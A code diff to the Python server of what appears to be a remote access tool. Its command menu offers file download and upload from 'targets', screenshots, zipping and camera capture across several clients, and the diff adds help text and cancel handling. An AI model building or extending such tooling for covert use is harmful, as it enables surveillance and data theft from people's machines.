@@ -64,8 +64,8 @@ class Server:
         print("d [path to open] @ [path to save] @ [clients] download file from target")
         print("u [path to open] @ [path to save] @ [clients] upload file to target")
         print("s [monitor] [path_to_save] @ [clients] capture screenshot")
-        print("z [path_to_open] @ [path_to_save] @ [clients]")
-        print("w [path_to_save] @ [clients]")
+        print("z [path_to_open] @ [path_to_save] @ [clients] zip file or folder")
+        print("w [path_to_save] @ [clients] capture camera picture")
         print("x exit server")
 
     def generate_texttable(self, connections):
@@ -169,6 +169,8 @@ class Server:
                         file.write(data)
             except socket.error as error:
                 self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+            except KeyboardInterrupt:
+                self.update_line("\r[-] DownloadCanceled")
             print()
 
     def upload_file(self, path_to_open, path_to_save, connections):
@@ -191,6 +193,8 @@ class Server:
                         self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
                 except socket.error as error:
                     self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
+                except KeyboardInterrupt:
+                    self.update_line("\r[-] UploadCanceled")
                 print()
 
     def make_screenshot(self, monitor, path_to_save, connections):
